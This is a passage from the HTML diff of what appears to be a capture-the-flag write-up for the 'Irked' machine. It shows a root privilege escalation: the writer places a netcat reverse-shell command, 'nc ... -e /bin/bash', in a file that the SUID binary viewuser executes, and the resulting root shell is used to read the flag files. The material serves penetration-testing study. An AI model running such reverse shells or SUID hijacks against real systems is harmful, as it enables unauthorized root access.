+                ircd@irked<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"nc&nbsp;10.10.14.12&nbsp;9002&nbsp;-e&nbsp;/bin/bash"</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>listusers<br>
+                ircd@irked<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;777&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>listusers<br>
+                ircd@irked<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>listusers<br>
+                -rwxrwxrwx&nbsp;1&nbsp;ircd&nbsp;ircd&nbsp;33&nbsp;Oct&nbsp;29&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>listusers
+            </div>
+        </div><br>
+        <br>
+        Run <code>viewuser</code>.<br>
+            <div class="codebox">
+                ircd@irked<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;viewuser<br>
+                This&nbsp;application&nbsp;is&nbsp;being&nbsp;devleoped&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;and&nbsp;<span style="color:#ff9d00;font-weight:700">test</span>&nbsp;user&nbsp;permissions<br>
+                It&nbsp;is&nbsp;still&nbsp;being&nbsp;actively&nbsp;developed<br>
+                <span style="color:#ff9d00;font-weight:700">(</span>unknown<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2019-10-29&nbsp;04<span style="color:#ff9d00;font-weight:700">:</span>54&nbsp;<span style="color:#ff9d00;font-weight:700">(:</span>0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        The binary will hang, and you shoudl have a root shell on your listener.<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.12]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.117]&nbsp;54095<br>
+                <span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1001<span style="color:#ff9d00;font-weight:700">(</span>ircd<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=1001<span style="color:#ff9d00;font-weight:700">(</span>ircd<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>root.txt<br>
+                8d8e9e8...<br>
+                <span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>djmardov<span style="color:#ff9d00;font-weight:700">/</span>Documents<span style="color:#ff9d00;font-weight:700">/</span>user.txt<br>
+                4a66a78...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+
+</body>
+</html>
